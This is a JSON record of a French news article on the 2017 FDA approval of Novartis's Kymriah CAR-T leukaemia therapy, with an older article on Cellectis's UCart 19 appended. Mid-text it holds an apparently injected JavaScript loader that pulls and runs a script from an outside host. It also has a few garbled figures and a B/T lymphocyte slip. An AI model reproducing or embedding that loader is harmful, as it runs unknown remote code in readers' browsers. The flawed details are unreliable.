{"title": "Une therapie genique approuvee aux Etats-Unis pour la premiere fois", "newspaper": "Futura Sciences", "author": ["Washington - AFP"], "date_publi": "2017-08-31", "content": "La FDA, l'agence americaine qui donne les autorisations pour les medicaments, a approuve la mise sur le marche de la premiere therapie genique dans le monde contre la leucemie. Le traitement baptise Kymriah utilise des globules blancs du patient qui sont genetiquement modifies. Ce qu'il faut retenir La FDA ( Food and Drug Administration )   a autorise le premier traitement de therapie genique contre la leucemie. Ce traitement a ete mis au point par l'entreprise Novartis. Un essai clinique sur 63 patients s'est avere concluant. La  Food and Drug Administration  (FDA) vient d'ouvrir une nouvelle ere pour traiter, et potentiellement guerir, de nombreuses maladies incurables. Elle a en effet approuve la mise sur le marche de la premiere  therapie genique  dans le monde contre la  leucemie , enterinant ainsi les recommandations de juillet d'un groupe consultatif d'experts independant. Ce traitement, le Kymriah (tisagenlecleucel), a ete developpe par un chercheur de l'universite de Pennsylvanie et brevete par les laboratoires helvetiques  Novartis  pour  traiter la leucemie  lymphoblastique aigue. Cette derniere progresse rapidement ; elle est le  cancer  du sang pediatrique le plus frequent aux Etats-Unis, avec environ 3.100 nouveaux cas diagnostiques annuellement chez les moins de 20 ans, selon l'Institut national du cancer (NCI). Le Kymriah est destine aux enfants et jeunes adultes jusqu'a 25 ans ayant resiste aux autres therapies contre cette leucemie ou ayant fait une rechute, ce qui se produit dans 15 a 20 % des cas. Selon Novartis, 600 malades seraient eligibles tous les ans aux Etats-Unis pour ce traitement. << Nous entrons dans une nouvelle ere de l'innovation medicale avec la capacite de reprogrammer les cellules immunitaires d'un malade pour qu'elles puissent detruire les cellules cancereuses mortelles >> , a souligne le docteur Scott Gottlieb, patron de la FDA.  << De nouvelles technologies telles les therapies geniques et cellulaires ont le potentiel de transformer la medecine en rendant possible le traitement et meme la guerison de nombreuses maladies  [jusque-la]  incurables >> , a-t-il estime. << Cette decision marque la premiere commercialisation dans le monde d'une  therapie genique ... fondee sur une nouvelle approche entierement personnalisee qui utilise les propres cellules immunitaires du malade >> , s'est quant a lui felicite le PDG de Novartis, Joseph Jimenez, lors d'une conference de presse telephonique. Les cellules immunitaires du patient sont prelevees, modifiees et reinjectees. (c) kukhunthod, Fotolia                               Des cellules immunitaires du patient sont genetiquement modifiees L'innocuite et l'efficacite du Kymriah ont ete demontrees par un essai clinique mene avec 63 malades pediatriques et de jeunes adultes qui n'avaient pas repondu aux autres traitements ou avaient rechute. Selon cette technique, un traitement est cree pour chaque patient dont des cellules immunitaires sont prelevees et congelees avant d'etre acheminees dans un laboratoire, ou elles sont modifiees genetiquement (cellules CAR-T) pour attaquer la leucemie. Le taux de remission a atteint 83 % dans les trois premiers mois du traitement qui a consiste en une seule dose de cellules immunitaires modifiees, precise la FDA.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le cout d'un traitement avec le Kymriah est de 475.000 dollars (environ 400.0000 euros au cours actuel), a indique Bruno Strigini, responsable du departement de cancerologie a Novartis, lors de la conference de presse. Les malades ne repondant pas pendant le premier mois ne paieront pas pour le traitement, a-t-il promis. Il a souligne que des therapies actuelles contre la leucemie, comme la  greffe  de  moelle osseuse , peuvent couter jusqu'a 800.000 dollars (675.0000 euros) aux Etats-Unis. La plupart des patients qui seront traites avec le Kymriah seront probablement couverts par leur assurance medicale ou le Medicaid, l'assurance maladie des personnes a bas revenus, selon Novartis. Voir aussi : La therapie genique guerit un bebe atteint de leucemie Le Kymriah peut avoir des effets secondaires severes, dont de graves infections, de fortes fievres, de l'hypotension arterielle, des problemes renaux et une diminution de l'oxygene dans le sang. Au vu du succes de l'essai clinique avec les 63 patients, la FDA avait, en 2014, attribue a cette therapie genique le statut << d'avancee therapeutique >>, qui permet d'accelerer les procedures de mise sur le marche. Novartis et d'autres laboratoires travaillent activement au developpement de traitements similaires pour le myelome multiple, une autre forme de leucemie et une tumeur agressive du cerveau. Pour en savoir plus Bientot une therapie genique efficace contre la leucemie ? Article d'Agnes Roux paru le 13 juillet 2013 En reprogrammant des  lymphocytes  T par  genie genetique , le procede UCart 19, presente par l'entreprise Cellectis, les rend capables de s'attaquer aux lymphocytes B cancereux. Cette therapie genique a montre son efficacite chez la souris pour traiter certains types de leucemie. Comme toute cellule de l'organisme, les cellules contenues dans le  sang  peuvent devenir cancereuses et provoquer des leucemies. Ces maladies graves sont classees en fonction du type de cellules qu'elles impactent et de leur  vitesse  d'evolution. Les  leucemies  les plus frequentes se caracterisent par la proliferation anormale des lymphocytes B, qui sont les cellules immunitaires a l'origine de la production des  anticorps . Differents traitements existent pour  soigner les leucemies , comme la  chimiotherapie , la  radiotherapie  et la  greffe de moelle osseuse . Cependant, ces methodes s'accompagnent de lourds effets secondaires et ne sont pas toujours efficaces. La  therapie genique  fait peu a peu son chemin comme solution pour  venir a bout des leucemies . Recemment, une petite fille et trois adultes ont pu etre sauves grace a cette methode de soin. Le succes de cette technologie n'est pourtant pas toujours garanti, comme en temoigne la mort de deux patients ayant subi ce traitement. Ces cellules, des precurseurs des lymphocytes B, sont issues d'un patient atteint de leucemie. Elles proliferent de maniere anormale et sont la cause de la maladie. (c) VachiDonsk, Wikipedia, CC by-sa 3.0                       La therapie genique repose sur l'introduction de  genes  dans les cellules afin de traiter une maladie. Dans le cas des leucemies a lymphocytes B, la strategie consiste a reprogrammer les  lymphocytes T  pour les transformer en cellules tueuses de lymphocytes B cancereux. La societe  Cellectis  vient recemment de mettre au point une methode de  therapie genique pour traiter la leucemie  de maniere efficace chez la souris. Des lymphocytes T tueurs de tumeurs Le procede est appele UCart 19. Le principe repose sur la production par les lymphocytes T d' anticorps  appeles recepteurs d'antigenes  chimeriques  (CAR), qui ciblent et detruisent les lymphocytes B cancereux.  << Les CAR sont concus pour se lier sur les recepteurs CD19 qui sont presents uniquement a la surface des lymphocytes B >> , explique Jennifer Moore, directrice de la communication de Cellectis. Le gene responsable de la synthese des CAR est integre dans le  genome  des lymphocytes B grace a un  lentivirus , un  virus  a  ARN  de la famille des  retrovirus . En penetrant dans la cellule, le  lentivirus  peut convertir son ARN en  ADN , puis integrer celui-ci dans le genome de la cellule. Les chercheurs ont ainsi pu utiliser un lentivirus modifie comme vehicule de livraison du gene codant pour les CAR. Une technologie qui fonctionne chez la souris Pour tester cette technologie, les scientifiques ont utilise des souris immunosupprimees, donc depourvues de  defenses immunitaires . Ils ont ensuite introduit dans ces  rongeurs  des lymphocytes B cancereux humains.  << Par cette approche, les chercheurs ont pu recreer un modele de leucemie a lymphocytes B chez la souris >> , indique Jennifer Moore. Apres quelques jours, des lymphocytes T modifies genetiquement qui produisent les anticorps diriges contre les  lymphocytes B cancereux  ont ete injectes. Les resultats montrent que les lymphocytes T producteurs de CAR sont capables de detruire les cellules cancereuses chez la souris. Bien que ce nouveau traitement soit prometteur, de nombreuses etudes sont encore necessaires pour tester son efficacite chez l'Homme. ", "theme": "sante"}